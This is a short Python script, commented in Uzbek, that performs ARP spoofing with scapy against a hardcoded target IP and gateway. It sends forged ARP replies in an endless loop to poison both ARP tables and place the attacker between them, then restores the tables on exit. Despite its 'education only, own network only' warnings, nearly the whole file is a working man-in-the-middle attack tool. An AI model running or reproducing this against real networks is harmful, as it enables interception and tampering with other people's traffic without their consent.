#!/usr/bin/env python3
"""
ARP Spoofing - FAQAT TA'LM UCHUN!
Faqat o'z tarmog'ingizda sinang!
Ruxsatsiz ishlatish JINOYAT!
"""

from scapy.all import ARP, Ether, srp, send
import time

def get_mac(ip):
    """IP dan MAC manzilni olish"""
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    result = srp(broadcast/arp_request, timeout=3, verbose=False)[0]
    
    if result:
        return result[0][1].hwsrc
    return None

def arp_spoof(target_ip, gateway_ip):
    """
    ARP spoofing - yolg'on ARP reply yuborish
    
    ⚠️  FAQAT O'Z TARMOG'INGIZDA SINANG!
    """
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)
    
    if not target_mac or not gateway_mac:
        print("❌ MAC topilmadi")
        return
    
    print(f"[*] Target: {target_ip} ({target_mac})")
    print(f"[*] Gateway: {gateway_ip} ({gateway_mac})")
    
    # Yolg'on ARP reply
    # Target ga: "Men gateway man"
    pkt1 = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
    send(pkt1, verbose=False)
    
    # Gateway ga: "Men target man"
    pkt2 = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)
    send(pkt2, verbose=False)

def restore(target_ip, gateway_ip):
    """ARP jadvalini to'g'ri qiymatlarga tiklash"""
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)
    
    # To'g'ri ARP reply yuborish
    pkt1 = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac)
    pkt2 = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip, hwsrc=target_mac)
    
    send(pkt1, count=5, verbose=False)
    send(pkt2, count=5, verbose=False)
    print("[*] ARP jadvali tiklandi")

if __name__ == "__main__":
    # ⚠️  FAQAT O'Z TARMOG'INGIZNI ISHLATING!
    TARGET = "192.168.1.100"      # Target qurilma IP
    GATEWAY = "192.168.1.1"       # Router IP
    
    print("⚠️  FAQAT O'Z TARMOG'INGIZDA SINANG!")
    print("⚠️  CTRL+C to'xtatish uchun\n")
    
    try:
        while True:
            arp_spoof(TARGET, GATEWAY)
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[*] To'xtatildi...")
        restore(TARGET, GATEWAY)
